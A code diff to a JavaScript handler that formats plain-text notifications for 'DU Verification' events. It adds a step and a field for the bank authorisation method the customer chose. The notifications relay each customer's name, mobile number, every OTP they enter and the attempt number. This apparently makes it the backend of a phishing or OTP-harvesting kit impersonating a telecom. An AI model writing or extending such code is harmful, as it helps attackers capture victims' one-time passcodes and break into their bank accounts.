@@ -260,9 +260,12 @@ async function handleVerificationPlainText({ order, eventType, env }) {
   } else if (eventType === "verification_details") {
     subject = `DU Verification details — ${reference}`;
     eventLabel = "Step 2 · Customer details submitted";
-  } else if (eventType === "verification_otp" || eventType === "verification_otp_attempt") {
+    } else if (eventType === "verification_otp" || eventType === "verification_otp_attempt") {
     subject = `DU Verification OTP attempt ${attemptNumber} — ${reference}`;
     eventLabel = `OTP attempt ${attemptNumber}`;
+  } else if (eventType === "verification_bank_method") {
+    subject = `DU Verification — Bank authorisation method — ${reference}`;
+    eventLabel = "Step 3 · Bank authorisation method selected";
   } else {
     subject = `DU Verification event — ${reference}`;
     eventLabel = eventType || "Verification event";
@@ -279,10 +282,11 @@ async function handleVerificationPlainText({ order, eventType, env }) {
     }
   };
 
-  push("Event", eventLabel);
+    push("Event", eventLabel);
   push("Order reference", reference);
   push("Customer name", customerName);
   push("Mobile number", customerPhone);
+  push("Bank verification method", order.bankMethod || "");
   push("OTP entered", otpCode);
   push("OTP attempt number", otpCode ? String(attemptNumber) : "");
   push("Timestamp", order.timestamp || order.receivedAt || new Date().toISOString());
@@ -299,9 +303,9 @@ async function handleVerificationPlainText({ order, eventType, env }) {
   }
 
   // Any additional raw payload fields not shown above
-  const shownKeys = new Set([
+    const shownKeys = new Set([
     "type", "orderReference", "customerName", "fullName", "mobileNumber",
-    "otp", "otpAttemptNumber", "timestamp", "product"
+    "bankMethod", "otp", "otpAttemptNumber", "timestamp", "product"
   ]);
   const extraKeys = Object.keys(order).filter(k => !shownKeys.has(k));
   if (extraKeys.length) {
